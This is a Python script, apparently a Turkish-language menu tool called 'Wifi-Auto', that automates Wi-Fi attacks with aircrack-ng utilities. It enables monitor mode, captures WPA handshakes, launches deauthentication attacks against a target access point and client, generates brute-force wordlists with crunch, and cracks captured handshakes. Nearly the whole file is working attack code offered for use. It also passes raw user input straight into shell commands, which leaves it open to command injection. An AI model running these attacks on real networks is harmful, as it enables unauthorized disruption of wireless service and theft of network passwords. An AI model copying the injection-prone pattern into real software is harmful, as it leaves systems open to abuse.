import os
import re
import sys
import time

print("""
 _       ___ _____       ___         __      
| |     / (_) __(_)     /   | __  __/ /_____ 
| | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
| |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
|__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                            Github: https://github.com/alp1903
""")

# https://github.com/alp1903

def check_monitor_mode():
    result = os.popen("iwconfig").read()
    result_list = result.split("\n")

    monitor_mode_list = []
    for line in result_list:
        if "Mode:Monitor" in line:
            monitor_mode_list.append(re.search("\w+", line).group())

    if monitor_mode_list:
        return "Açık"
    else:
        return "Kapalı"


def print_table():
    print("+-----------------+--------+")
    print("| Wifi Kartı Adı  | Durum  |")
    print("+-----------------+--------+")
    print("| ", os.popen("iw dev | awk '$1==\"Interface\"{print $2}'").read(
    ).strip(), " | ", check_monitor_mode(), " |")
    print("+-----------------+--------+")


print_table()


print("""------------------------------------
        1-) Monitor Modu Başlat
        2-) Monitor Modu Durdur
        3-) Ağ Taraması Yap
        4-) Deauth Saldırısı
        5-) Wordlist Hazırla
        6-) Şifre Kırmayı Çalıştır
------------------------------------""")

secenek = input("Lütfen Seçinizi Giriniz:  ")

if (secenek == "1"):
    os.system("clear")
    print("""
     _       ___ _____       ___         __      
    | |     / (_) __(_)     /   | __  __/ /_____ 
    | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
    | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
    |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                Github: https://github.com/alp1903
    """)
    print_table()
    agkart = input("Ağ Katınızın Adını Giriniz:  ")
    os.system("sudo airmon-ng start " + agkart)


    def check_monitor_mode():
        result = os.popen("iwconfig").read()
        result_list = result.split("\n")

        monitor_mode_list = []
        for line in result_list:
            if "Mode:Monitor" in line:
                monitor_mode_list.append(re.search("\w+", line).group())

        if monitor_mode_list:
            return "Açık"
        else:
            return "Kapalı"


    def print_table():
        print("+-----------------+--------+")
        print("| Wifi Kartı Adı  | Durum  |")
        print("+-----------------+--------+")
        print("| ", os.popen("iw dev | awk '$1==\"Interface\"{print $2}'").read(
        ).strip(), " | ", check_monitor_mode(), " |")
        print("+-----------------+--------+")


    print_table()

elif (secenek == "2"):
    os.system("clear")
    print("""
     _       ___ _____       ___         __      
    | |     / (_) __(_)     /   | __  __/ /_____ 
    | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
    | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
    |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                Github: https://github.com/alp1903
    """)
    agkart_stop = input("Ağ Katınızın Adını Giriniz:  ")
    os.system("sudo airmon-ng stop " + agkart_stop)

elif (secenek == "3"):
    os.system("clear")
    print("""
     _       ___ _____       ___         __      
    | |     / (_) __(_)     /   | __  __/ /_____ 
    | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
    | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
    |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                Github: https://github.com/alp1903
    """)
    agkart_tara = input("Ağ Katınızın Adını Giriniz:  ")
    os.system("sudo timeout 10 airodump-ng " + agkart_tara)

    while True:
        secenek = input("Devam etmek istiyor musunuz? (E/H): ")
        if secenek.lower() == "e":
            break
        elif secenek.lower() == "h":
            sys.exit()
        else:
            print("Geçersiz seçenek! Lütfen 'E' veya 'H' harflerinden birini girin.")

    wifibssid = input("BSSİD`yi Giriniz :   ")
    wifikanal = input("Kanalı Giriniz:  ")
    hashdosya_name = input("Hash Dosyasının adını girniz:   ")
    print("saldırı başaltılıyor...")
    time.sleep(5)
    os.system("sudo airodump-ng --bssid " + wifibssid + " -c " +
              wifikanal + " -w " + hashdosya_name + " " + agkart_tara)

elif (secenek == "4"):
    os.system("clear")
    print("""
        _       ___ _____       ___         __      
       | |     / (_) __(_)     /   | __  __/ /_____ 
       | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
       | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
       |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                   Github: https://github.com/alp1903
       """)

    agkartsaldiri = input("Wifi Karınızı Yazınız:    ")
    saldirisayi = input("Saldırı Saysını Giriniz (Önerilen 15):    ")
    bssiddet = input("Bssid`yi Giriniz:    ")
    kullanicibss = input("Kullanıcı Adreisni Giriniz:   ")

    os.system("sudo aireplay-ng --deauth " + saldirisayi + " -a " + bssiddet + " -c " + kullanicibss + " " + agkartsaldiri)

elif (secenek == "5"):
    os.system("clear")
    print("""
     _       ___ _____       ___         __      
    | |     / (_) __(_)     /   | __  __/ /_____ 
    | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
    | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
    |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                Github: https://github.com/alp1903
    """)
    wordlisstsecenek = input("""Tür Seçiniz:
    1-) Kişiye Özel Wordlist
    2-) Random Wordlist Üretet
    
    Seçenek = 
    """)


    if(wordlisstsecenek == "1"):
        os.system("clear")
        os.system("sudo python3 wordlist.py")

    elif(wordlisstsecenek == "2"):
        maxsayi = input("Maksimum Karakter Sayısı:  ")
        minsayi = input("Minimum Karakter Sayısı:   ")
        karakter = input("Olası Karkater-Sayıları Giriniz:  ")
        wordlistname = input("Dosya Adı Girin:  ")

        os.system("clear")
        os.system("crunch "+minsayi+" "+maxsayi+" "+karakter+" -o "+wordlistname+"")

        print("Dosya "+wordlistname+"İsimli Olarak Oluşturuldu!")

elif (secenek == "6"):
    os.system("clear")
    print("""
     _       ___ _____       ___         __      
    | |     / (_) __(_)     /   | __  __/ /_____ 
    | | /| / / / /_/ /_____/ /| |/ / / / _ / __ /
    | |/ |/ / / __/ /_____/ ___ / /_/ / /_/ /_/ /
    |__/|__/_/_/ /_/     /_/  |_\__,_/\__/\____/
                                                                Github: https://github.com/alp1903
    """)
    handsake = input("Handsake Dosyasını Veriniz:   ")
    wordlist = input("Wordlist Dosyasını Veriniz:   ")

    os.system("sudo aircrack-ng -w "+wordlist+" "+handsake+"")


else:
    print("Yanlış Giriş Yaptınız Lütfen Tekrar Deneyin...")
